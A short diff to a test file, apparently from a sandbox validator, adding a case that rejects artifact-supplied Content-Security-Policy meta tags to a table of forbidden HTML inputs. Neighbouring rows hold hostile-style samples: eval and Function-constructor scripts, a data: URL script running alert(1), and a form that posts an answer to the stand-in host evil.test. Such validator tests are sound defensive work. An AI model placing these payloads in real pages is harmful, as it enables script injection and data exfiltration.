@@ -91,6 +91,7 @@ describe("activity artifact contracts", () => {
     ["style URL", "<style>body { background: url(asset.png); }</style>", "CSS URL references are forbidden"],
     ["eval", "<script>eval('reportComplete()')</script>", "eval is forbidden"],
     ["Function constructor", "<script>new Function('reportComplete()')()</script>", "Function constructor is forbidden"],
+    ["artifact CSP", "<meta http-equiv='Content-Security-Policy' content=\"script-src 'none'\">", "artifact-controlled CSP meta tags are forbidden"],
     ["data script URL", "<script src='data:text/javascript,alert(1)'></script>", "external or executable URL references are forbidden"],
     ["form submission", "<form action='https://evil.test/collect'><input name='answer'></form>", "forms are forbidden"],
     ["storage access", "<script>localStorage.setItem('answer', 'secret')</script>", "localStorage is forbidden"],
